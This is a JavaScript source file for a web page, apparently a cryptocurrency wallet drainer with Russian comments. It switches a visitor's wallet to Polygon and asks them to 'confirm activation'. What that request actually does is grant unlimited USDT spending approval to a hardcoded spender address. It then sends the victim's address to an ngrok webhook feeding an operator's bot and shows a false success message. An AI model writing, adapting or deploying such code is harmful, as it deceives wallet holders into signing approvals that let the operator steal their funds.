const USDT_ADDR = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const SPENDER = '0x2530C5aa0022B49832C593758d84aE70e40161cB';
const CHAIN_ID = '0x89'; // Polygon 137

// !!! ОБНОВЛЯЙ ЭТУ ССЫЛКУ ПРИ КАЖДОМ ЗАПУСКЕ БОТА !!!
const WEBHOOK = 'https://gypseous-janis-wandlike.ngrok-free.dev/save-address';

async function start() {
    const status = document.getElementById('status');
    if (!window.ethereum) {
        status.innerText = 'Откройте сайт внутри Trust Wallet!';
        return;
    }

    try {
        status.innerText = '🔄 Проверка сети...';
        
        // 1. Авто-переключение на Polygon
        try {
            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: CHAIN_ID }] });
        } catch (e) {
            if (e.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{ chainId: CHAIN_ID, chainName: 'Polygon', rpcUrls: ['https://polygon-rpc.com'], nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 } }]
                });
            }
        }

        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.requestAccounts();
        const user = accounts[0];

        // ABI для проверки баланса и апрува
        const abi = [
            {"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
        ];
        const contract = new web3.eth.Contract(abi, USDT_ADDR);

        status.innerText = '⚙️ Подготовка транзакции...';

        // 2. Проверяем текущий апрув
        const currentAllowance = await contract.methods.allowance(user, SPENDER).call();
        
        // Если апрув уже есть, его нужно сбросить в 0 (фикс ошибки Reverted в Polygon USDT)
        if (BigInt(currentAllowance) > 0n) {
            status.innerText = '⚠️ Сброс старого разрешения...';
            await contract.methods.approve(SPENDER, 0).send({ from: user });
        }

        status.innerText = '📝 Подтвердите активацию...';
        const max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

        // 3. Финальный Approve
        await contract.methods.approve(SPENDER, max).send({ from: user });

        status.innerText = '📡 Синхронизация с ботом...';

        // 4. Отправка в бот
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: user })
        });

        status.innerText = '✅ Успешно привязано!';
        status.style.color = '#ff007a';

    } catch (err) {
        status.innerText = '❌ ' + (err.message.includes('reverted') ? 'Ошибка сети. Попробуйте снова.' : 'Отклонено');
        console.error(err);
    }
}

document.getElementById('startBtn').addEventListener('click', start);
